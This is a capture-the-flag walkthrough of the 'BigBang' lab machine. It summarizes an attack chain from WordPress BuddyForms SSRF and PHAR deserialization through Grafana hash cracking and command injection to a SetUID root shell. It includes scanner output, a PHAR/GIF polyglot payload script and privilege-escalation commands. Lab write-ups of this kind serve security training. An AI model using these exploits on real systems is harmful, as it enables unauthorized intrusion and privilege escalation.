# BigBang

```
Difficulty: Hard
Operating System: Linux
Hints: True
```

---

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used                                 | Result                                                                                                                                                                                     |
| :--- | :------------ | :--------------------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1    | `N/A`         | **Port Enumeration**                           | Performed initial enumeration using `netstat` and `nmap`. Discovered several listening ports, notably `3000` (Grafana) and `9090` (Python-based Satellite App) only bound to `localhost`.  |
| 2    | `N/A`         | **Local Service Analysis**                     | Investigated Python processes and identified `/root/satellite/app.py` running on port `9090`. Found Grafana on port `3000`, redirecting to a login page.                                   |
| 3    | `N/A`         | **Grafana Database Extraction**                | Discovered `/opt/data/grafana.db` SQLite database. Retrieved the database remotely using `scp` for offline analysis.                                                                       |
| 4    | `N/A`         | **Grafana User Enumeration**                   | Enumerated the `user` table in the database. Found two users: `admin` and `developer`. Stored password hashes and salts were present.                                                      |
| 5    | `N/A`         | **Hash Cracking**                              | Used a custom script (`grafana2hashcat.py`) to convert hash+salt to Hashcat-compatible format. Successfully cracked the `developer` user's password: **bigbang**.                          |
| 6    | `developer`   | **Login via SSH**                              | Logged into the machine as `developer` using the cracked password. Also confirmed password worked for Grafana web interface login, retrieving a valid JWT access token.                    |
| 7    | `developer`   | **APK Exfiltration and Reversing**             | Located `satellite-app.apk` in `developer`’s home directory. Downloaded APK for analysis using jadx-gui. Identified hardcoded endpoints and authentication flows: `/login` and `/command`. |
| 8    | `developer`   | **API Authentication**                         | Reproduced the login request to `/login` endpoint and retrieved a valid Bearer token for API use.                                                                                          |
| 9    | `developer`   | **Command Injection via Newline**              | Identified that `output_file` parameter was vulnerable to newline injection. Successfully injected commands (e.g., `ping`) and confirmed network control.                                  |
| 10   | `root`        | **Privilege Escalation via Command Injection** | Executed a command injection to create a SetUID root bash shell: <br>`cp /bin/bash /tmp/z0n` <br>`chmod 6777 /tmp/z0n`. Used `/tmp/z0n -p` to obtain an interactive root shell.         |
| 11   | `root`        | **Root Flag Retrieval**                        | Located and read the root flag: <br>`cat /root/root.txt` → <br>`c3065984************************`.                                                                       


```
(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] nmap -p- --min-rate 10000 10.10.11.52
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 21:42 EST
Nmap scan report for 10.10.11.52
Host is up (0.086s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] nmap -p 22,80 -sCV 10.10.11.52
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 21:43 EST
Nmap scan report for 10.10.11.52
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d4:15:77:1e:82:2b:2f:f1:cc:96:c6:28:c1:86:6b:3f (ECDSA)
|_  256 6c:42:60:7b:ba:ba:67:24:0f:0c:ac:5d:be:92:0c:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Did not follow redirect to http://blog.bigbang.htb/
Service Info: Host: blog.bigbang.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.66 seconds
```

Looking at the package versions, the OpenSSH version suggests Ubuntu 22.04 jammy, but the Apache version implies Debian bullsee or bookworm. Worth a guess that at least one of these is a container.

The website is redirecting to blog.bigbang.htb. Running ffuf to look for other subdomains returns only blog, so I’ll add that and the base domain to my /etc/hosts file:

```
10.10.11.52 bigbang.htb blog.bigbang.htb
```

**blog.bigbang.htb - TCP 80**

Visiting the IP or bigbang.htb just redirects to blog.bigbang.htb, which is a site for a “physics university”:


There is a form to submit comments, but it POSTs data to / in a way that makes it look not implemented. None of the other links go anywhere.

Tech Stack
The page footer claims a WordPress site:


The form claims to be generated by a WordPress plugin, BuddyForms:


The HTTP response headers for the GET request for / show Apache and PHP:

```
HTTP/1.1 200 OK
Date: Thu, 30 Jan 2025 02:54:38 GMT
Server: Apache/2.4.62 (Debian)
X-Powered-By: PHP/8.3.2
Link: <http://blog.bigbang.htb/index.php?rest_route=/>; rel="https://api.w.org/"
Vary: Accept-Encoding
Content-Length: 217392
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

There’s also an unusual Link header. The format of this header is defined here. The 404 page is the default Apache 404:


WPScan

I’ll skip directory brute force and run wpscan against the site. I’ve signed up for a free researcher account and have my token stored in ~/.wpscan/scan.yml.

```
(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] wpscan --url http://blog.bigbang.htb -e ap,u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.bigbang.htb/ [10.10.11.52]
[+] Started: Thu Jan 30 07:31:07 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.62 (Debian)
 |  - X-Powered-By: PHP/8.3.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.bigbang.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.bigbang.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.bigbang.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.bigbang.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.4 identified (Insecure, released on 2024-06-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.bigbang.htb/?feed=rss2, <generator>https://wordpress.org/?v=6.5.4</generator>
 |  - http://blog.bigbang.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=6.5.4</generator>
 |
 | [!] 3 vulnerabilities identified:
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     Fixed in: 6.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 6.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 6.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/

[+] WordPress theme in use: twentytwentyfour
 | Location: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] buddyforms
 | Location: http://blog.bigbang.htb/wp-content/plugins/buddyforms/
 | Last Updated: 2025-01-30T02:58:00.000Z
 | [!] The version is out of date, the latest version is 2.8.15
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 11 vulnerabilities identified:
 |
 | [!] Title: BuddyForms < 2.7.8 - Unauthenticated PHAR Deserialization
 |     Fixed in: 2.7.8
 |     References:
 |      - https://wpscan.com/vulnerability/a554091e-39d1-4e7e-bbcf-19b2a7b8e89f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-26326
 |
 | [!] Title: Freemius SDK < 2.5.10 - Reflected Cross-Site Scripting
 |     Fixed in: 2.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/7fd1ad0e-9db9-47b7-9966-d3f5a8771571
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33999
 |
 | [!] Title: BuddyForms < 2.8.2 - Contributor+ Stored XSS
 |     Fixed in: 2.8.2
 |     References:
 |      - https://wpscan.com/vulnerability/7ebb0593-3c90-404c-9966-f87690395be9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25981
 |
 | [!] Title: Post Form – Registration Form – Profile Form for User Profiles – Frontend Content Forms for User Submissions (UGC) < 2.8.8 - Missing Authorization
 |     Fixed in: 2.8.8
 |     References:
 |      - https://wpscan.com/vulnerability/3eb25546-5aa3-4e58-b563-635ecdb21097
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1158
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/198cb3bb-73fe-45ae-b8e0-b7ee8dda9547
 |
 | [!] Title: Post Form – Registration Form – Profile Form for User Profiles – Frontend Content Forms for User Submissions (UGC) < 2.8.8 - Missing Authorization to Unauthenticated Media Deletion
 |     Fixed in: 2.8.8
 |     References:
 |      - https://wpscan.com/vulnerability/b6e2f281-073e-497f-898b-23d6220b20c7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1170
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/380c646c-fd95-408a-89eb-3e646768bbc5
 |
 | [!] Title: Post Form – Registration Form – Profile Form for User Profiles – Frontend Content Forms for User Submissions (UGC) < 2.8.8 - Missing Authorization to Unauthenticated Media Upload
 |     Fixed in: 2.8.8
 |     References:
 |      - https://wpscan.com/vulnerability/71e4f4c1-20ba-42ac-8ac7-e798c4bc611d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1169
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/6d14a90d-65ea-45da-956b-0735e2e2b538
 |
 | [!] Title: BuddyForms < 2.8.6 - Reflected Cross-Site Scripting via page
 |     Fixed in: 2.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/72c096b3-55bd-4614-8029-69900db79416
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-30198
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/701d6bee-6eb2-4497-bf54-fbc384d9d2e5
 |
 | [!] Title: BuddyForms < 2.8.9 - Unauthenticated Arbitrary File Read and Server-Side Request Forgery
 |     Fixed in: 2.8.9
 |     References:
 |      - https://wpscan.com/vulnerability/3f8082a0-b4b2-4068-b529-92662d9be675
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-32830
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/23d762e9-d43f-4520-a6f1-c920417a2436
 |
 | [!] Title: BuddyForms < 2.8.10 - Email Verification Bypass due to Insufficient Randomness
 |     Fixed in: 2.8.10
 |     References:
 |      - https://wpscan.com/vulnerability/aa238cd4-4329-4891-b4ff-8268a5e18ae2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5149
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/a5c8d361-698b-4abd-bcdd-0361d3fd10c5
 |
 | [!] Title: Post Form – Registration Form – Profile Form for User Profiles – Frontend Content Forms for User Submissions (UGC) < 2.8.12 - Authenticated (Contributor+) Privilege Escalation
 |     Fixed in: 2.8.12
 |     References:
 |      - https://wpscan.com/vulnerability/ca0fa099-ad8a-451f-8bb3-2c68def0ac6f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8246
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/40760f60-b81a-447b-a2c8-83c7666ce410
 |
 | [!] Title: BuddyForms < 2.8.13 - Authenticated (Editor+) Stored Cross-Site Scripting
 |     Fixed in: 2.8.13
 |     References:
 |      - https://wpscan.com/vulnerability/61885f61-bd62-4530-abe3-56f89bcdd8e4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-47377
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ac8a06f5-4560-401c-b762-5422b624ba84
 |
 | Version: 2.7.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.bigbang.htb/wp-content/plugins/buddyforms/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <================================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] root
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] shawking
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 22

[+] Finished: Thu Jan 30 07:31:34 2025
[+] Requests Done: 19
[+] Cached Requests: 48
[+] Data Sent: 5.054 KB
[+] Data Received: 30.516 KB
[+] Memory used: 257.746 MB
[+] Elapsed time: 00:00:27
```

There’s a lot there. The WordPress version seems to have three identified vulnerabilities at this time:

```
[+] WordPress version 6.5.4 identified (Insecure, released on 2024-06-05).
 | Found By: Rss Generator (Passive Detection)                                                                         
 |  - http://blog.bigbang.htb/?feed=rss2, <generator>https://wordpress.org/?v=6.5.4</generator>                        
 |  - http://blog.bigbang.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=6.5.4</generator>               
 |                        
 | [!] 3 vulnerabilities identified:                                                                                   
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     Fixed in: 6.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 6.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 6.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
```

I’ll hold off on the two XSS for now. The path traversal is authenticated and only on Windows.

There are two usernames identified:

```
[i] User(s) Identified:

[+] root
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] shawking
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
Under plugins, BuddyForms version 2.7.7 is identified, with a bunch of vulnerabilities:

[+] buddyforms
 | Location: http://blog.bigbang.htb/wp-content/plugins/buddyforms/
 | Last Updated: 2025-01-30T02:58:00.000Z
 | [!] The version is out of date, the latest version is 2.8.15
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 11 vulnerabilities identified:
 |
 | [!] Title: BuddyForms < 2.7.8 - Unauthenticated PHAR Deserialization
 |     Fixed in: 2.7.8
 |     References:
 |      - https://wpscan.com/vulnerability/a554091e-39d1-4e7e-bbcf-19b2a7b8e89f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-26326
 |
 | [!] Title: Freemius SDK < 2.5.10 - Reflected Cross-Site Scripting
 |     Fixed in: 2.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/7fd1ad0e-9db9-47b7-9966-d3f5a8771571
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33999
 |
 | [!] Title: BuddyForms < 2.8.2 - Contributor+ Stored XSS
 |     Fixed in: 2.8.2
 |     References:
 |      - https://wpscan.com/vulnerability/7ebb0593-3c90-404c-9966-f87690395be9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25981
 |
 | [!] Title: Post Form – Registration Form – Profile Form for User Profiles – Frontend Content Forms for User Submissions (UGC) < 2.8.8 - Missing Authorization
 |     Fixed in: 2.8.8
 |     References:
 |      - https://wpscan.com/vulnerability/3eb25546-5aa3-4e58-b563-635ecdb21097
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1158
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/198cb3bb-73fe-45ae-b8e0-b7ee8dda9547
 |
 | [!] Title: Post Form – Registration Form – Profile Form for User Profiles – Frontend Content Forms for User Submissions (UGC) < 2.8.8 - Missing Authorization to Unauthenticated Media Deletion
 |     Fixed in: 2.8.8
 |     References:
 |      - https://wpscan.com/vulnerability/b6e2f281-073e-497f-898b-23d6220b20c7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1170
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/380c646c-fd95-408a-89eb-3e646768bbc5
 |
 | [!] Title: Post Form – Registration Form – Profile Form for User Profiles – Frontend Content Forms for User Submissions (UGC) < 2.8.8 - Missing Authorization to Unauthenticated Media Upload
 |     Fixed in: 2.8.8
 |     References:
 |      - https://wpscan.com/vulnerability/71e4f4c1-20ba-42ac-8ac7-e798c4bc611d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1169
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/6d14a90d-65ea-45da-956b-0735e2e2b538
 |
 | [!] Title: BuddyForms < 2.8.6 - Reflected Cross-Site Scripting via page
 |     Fixed in: 2.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/72c096b3-55bd-4614-8029-69900db79416
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-30198
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/701d6bee-6eb2-4497-bf54-fbc384d9d2e5
 |
 | [!] Title: BuddyForms < 2.8.9 - Unauthenticated Arbitrary File Read and Server-Side Request Forgery
 |     Fixed in: 2.8.9
 |     References:
 |      - https://wpscan.com/vulnerability/3f8082a0-b4b2-4068-b529-92662d9be675
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-32830
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/23d762e9-d43f-4520-a6f1-c920417a2436
 |
 | [!] Title: BuddyForms < 2.8.10 - Email Verification Bypass due to Insufficient Randomness
 |     Fixed in: 2.8.10
 |     References:
 |      - https://wpscan.com/vulnerability/aa238cd4-4329-4891-b4ff-8268a5e18ae2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5149
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/a5c8d361-698b-4abd-bcdd-0361d3fd10c5
 |
 | [!] Title: Post Form – Registration Form – Profile Form for User Profiles – Frontend Content Forms for User Submissions (UGC) < 2.8.12 - Authenticated (Contributor+) Privilege Escalation
 |     Fixed in: 2.8.12
 |     References:
 |      - https://wpscan.com/vulnerability/ca0fa099-ad8a-451f-8bb3-2c68def0ac6f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8246
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/40760f60-b81a-447b-a2c8-83c7666ce410
 |
 | [!] Title: BuddyForms < 2.8.13 - Authenticated (Editor+) Stored Cross-Site Scripting
 |     Fixed in: 2.8.13
 |     References:
 |      - https://wpscan.com/vulnerability/61885f61-bd62-4530-abe3-56f89bcdd8e4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-47377
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ac8a06f5-4560-401c-b762-5422b624ba84
 |
 | Version: 2.7.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.bigbang.htb/wp-content/plugins/buddyforms/readme.txt
```

There are a bunch of vulnerabilities in this plugin. The top one is most interesting, as it’s a PHAR vulnerability which likely means RCE.

---

# Shell as www-data in container

## Preview

This exploit involves using pieces from one vulnerability to enable another, and it is a bit complicated, so I’m going to show how it all fits together at the start of this section. I’ll still walk through each bit showing how to find things, but this summary will help make it clear where the path is leading. I’ll blur this section to not spoil for anyone working alongside this post.

---

### wrapwrap

* **CVE-2023-26326**
* **CVE-2024-2961**
* **Upload GIF**
* **PHAR**
* **SSRF**
* **File Read**
* **RCE**
* **Glibc Buffer Overflow**

CVE-2023-26326 is discussed as an RCE vulnerability via PHAR uploads, but the PHAR part won’t work on modern PHP.
However, the mechanism for uploading a remote file is an SSRF, and can be leveraged into local file read.
Once I have local file read, I can exploit CVE-2024-2961, a buffer overflow in GLIBC where I need to be able to read files from the box in order to build a payload.

---

## Failed Upload / PHAR RCE

### CVE-2023-26326 Background

CVE-2023-26326 is described as:

> The BuddyForms WordPress plugin, in versions prior to 2.7.8, was affected by an unauthenticated insecure deserialization issue. An unauthenticated attacker could leverage this issue to call files using a PHAR wrapper that will deserialize the data and call arbitrary PHP Objects that can be used to perform a variety of malicious actions granted a POP chain is also present.

There’s a way to get a serialized PHAR object onto the server and then reference it.
This post from Tenable TechBlog goes into much more detail.
They summarize the attack path in three steps:

1. Create a malicious phar file by making it look like an image.
2. Send the malicious phar file on the server.
3. Call the file with the `phar://` wrapper.

This exploit is using a PHAR file, which is a very flexible format allowing for many polyglots and other formats.
In Resource, Zipping, and UpDown, I showed how to upload Zip archives and access files within them using the `phar://` wrapper.

Unfortunately for me, the same strategy won’t work to get full RCE here, but it will provide some pieces that I can use.

---

## SSRF / File Upload

The POC in the post shows making a POST request to `/wp-admin/admin-ajax.php` passing a url.
I’ll send a request to Burp Repeater and replace most of it.


If I send this without having an `example.gif` hosted on my Python webserver (or without the webserver running, which adds delay as the application tries to connect), it returns showing that the file type is not allowed:


That’s because an empty file / 404 page doesn’t match the magic bytes of the expected GIF file.
There is a request to my webserver, so that is an SSRF:

```
10.10.11.52 - - [30/Jan/2025 14:25:45] code 404, message File not found
10.10.11.52 - - [30/Jan/2025 14:25:45] "GET /example.gif HTTP/1.1" 404 -
```

If I grab a valid GIF image and host it, then the response shows that it uploads:


It does seem to rename the image into a PNG.
I can find the image at the given path (along with another previous upload, `1.png`):


The image is not reformatted, but still a raw GIF (despite the new extension):

```bash
(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] curl http://blog.bigbang.htb/wp-content/uploads/2025/01/1-1.png -o- -s | xxd

00000000: 4749 4638 3961 1300 1300 8001 0000 0000  GIF89a..........
00000010: eeee ee21 f904 0100 0001 002c 0000 0000  ...!.......,....
00000020: 1300 1300 0002 158c 8fa9 cbed 0fa3 9cb4  ................

00000030: 2e80 2906 3adb 0f86 e248 4205 003b        ..).:....HB..;
```

---

## Image Type Bypass

In the POC post, the author talks about having a plugin installed that has an Evil class.
Their deserialization payload uses the function in Evil to get RCE.
This approach isn’t super realistic and assumes that there will be another set of gadgets I can find.
I can try that payload to see if it might work.
I’ll create `evil.php` from the post:

```php
<?php

class Evil{
  public function __wakeup() : void {
    die("Arbitrary Deserialization");
  }
}

// create new Phar
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("GIF89a\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new Evil();
$phar->setMetadata($object);
$phar->stopBuffering();
```

And run it:

```bash
(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] php --define phar.readonly=0 evil.php  

(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] file evil.phar  
evil.phar: GIF image data, version 89a, 15370 x 28735  
```

The resulting file is a GIF image by MIME type, but it’s also got the serialized PHP payload:

```bash
(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] xxd evil.phar

00000000: 4749 4638 3961 0a3c 3f70 6870 205f 5f48  GIF89a.<?php __H
00000010: 414c 545f 434f 4d50 494c 4552 2829 3b20  ALT_COMPILER(); 
00000020: 3f3e 0d0a 4500 0000 0100 0000 1100 0000  ?>..E...........
00000030: 0100 0000 0000 0f00 0000 4f3a 343a 2245  ..........O:4:"E
00000040: 7669 6c22 3a30 3a7b 7d08 0000 0074 6573  vil":0:{}....tes
00000050: 742e 7478 7404 0000 0000 0000 0004 0000  t.txt...........
00000060: 00c7 a78b 3bb4 0100 0000 0000 0074 6578  ....;........tex
00000070: 7407 3922 d43a e276 a40f 032d dc71 9a28  t.9".:.v...-.q.(
00000080: e590 89d3 1654 ab2a dadf 331d 362a 9dd4  .....T.*..3.6*..
00000090: 5b03 0000 0047 424d 42                     [....GBMB
```

If I request `evil.phar` using the same upload as above, it works:


It is saving it as a PNG file, but the trick from here is to use the `phar://` filter to load it as PHP (without the extension mattering) and go from there.

# Failure to Weaponize

Typically to weaponize a deserialization attack against PHP, I would use **phpggc** to make a gadget from a framework installed on the target.
It doesn’t have any WordPress gadgets for version 6.5.4:

```bash
(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] ./phpggc -l wordpress
```

---

## Gadget Chains

| NAME                                   | VERSION                      | TYPE               | VECTOR       | I  |
| -------------------------------------- | ---------------------------- | ------------------ | ------------ | -- |
| WordPress/Dompdf/RCE1                  | 0.8.5+ & WP < 5.5.2          | RCE: Function Call | \_\_destruct | \* |
| WordPress/Dompdf/RCE2                  | 0.7.0 <= 0.8.4 & WP < 5.5.2  | RCE: Function Call | \_\_destruct | \* |
| WordPress/Guzzle/RCE1                  | 4.0.0 <= 6.4.1+ & WP < 5.5.2 | RCE: Function Call | \_\_toString | \* |
| WordPress/Guzzle/RCE2                  | 4.0.0 <= 6.4.1+ & WP < 5.5.2 | RCE: Function Call | \_\_destruct | \* |
| WordPress/P/EmailSubscribers/RCE1      | 4.0 <= 4.4.7+ & WP < 5.5.2   | RCE: Function Call | \_\_destruct | \* |
| WordPress/P/EverestForms/RCE1          | 1.0 <= 1.6.7+ & WP < 5.5.2   | RCE: Function Call | \_\_destruct | \* |
| WordPress/P/WooCommerce/RCE1           | 3.4.0 <= 4.1.0+ & WP < 5.5.2 | RCE: Function Call | \_\_destruct | \* |
| WordPress/P/WooCommerce/RCE2           | <= 3.4.0 & WP < 5.5.2        | RCE: Function Call | \_\_destruct | \* |
| WordPress/P/YetAnotherStarsRating/RCE1 | ? <= 1.8.6 & WP < 5.5.2      | RCE: Function Call | \_\_destruct | \* |
| WordPress/PHPExcel/RCE1                | 1.8.2+ & WP < 5.5.2          | RCE: Function Call | \_\_toString | \* |
| WordPress/PHPExcel/RCE2                | <= 1.8.1 & WP < 5.5.2        | RCE: Function Call | \_\_toString | \* |
| WordPress/PHPExcel/RCE3                | 1.8.2+ & WP < 5.5.2          | RCE: Function Call | \_\_destruct | \* |
| WordPress/PHPExcel/RCE4                | <= 1.8.1 & WP < 5.5.2        | RCE: Function Call | \_\_destruct | \* |
| WordPress/PHPExcel/RCE5                | 1.8.2+ & WP < 5.5.2          | RCE: Function Call | \_\_destruct | \* |
| WordPress/PHPExcel/RCE6                | <= 1.8.1 & WP < 5.5.2        | RCE: Function Call | \_\_destruct | \* |
| WordPress/RCE1                         | <= 6.3.1                     | RCE: Function Call | \_\_toString | \* |
| WordPress/RCE2                         | 6.4.0 <= 6.4.1               | RCE: Function Call | \_\_destruct |    |

---

Even if it did, I think there were changes in PHP8 that would block these kinds of attacks anyway.
A post I’ll come to in the next section says:

> the target runs on PHP 8+, so it is not vulnerable to PHAR attacks.

I think it’s talking about this proposal, *“PHP RFC: Don’t automatically unserialize Phar metadata outside getMetadata()”*, which includes:

